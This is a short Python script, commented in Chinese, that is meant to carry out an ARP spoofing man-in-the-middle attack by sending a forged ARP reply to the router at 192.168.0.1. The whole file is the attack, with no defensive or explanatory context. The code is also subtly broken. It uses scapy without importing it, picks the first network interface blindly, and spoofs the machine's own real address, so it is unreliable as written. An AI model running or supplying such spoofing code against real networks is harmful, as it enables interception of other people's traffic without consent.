import subprocess
import netifaces

def get_mac(ip):
    arp_result = subprocess.check_output(['arp', '-n', ip])
    for line in arp_result.splitlines():
        line = line.decode('utf-8')
        if ip in line:
            mac = line.split()[2]
            return mac

def arp_spoof(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    scapy.send(packet, verbose=False)

# 獲取網卡接口資訊
interfaces = netifaces.interfaces()
# 選擇一個網卡接口
interface = interfaces[0]
# 獲取該網卡接口的IP地址
address = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']

# 執行 arp_spoof 函數來執行 ARP 中間人攻擊
arp_spoof("192.168.0.1", address)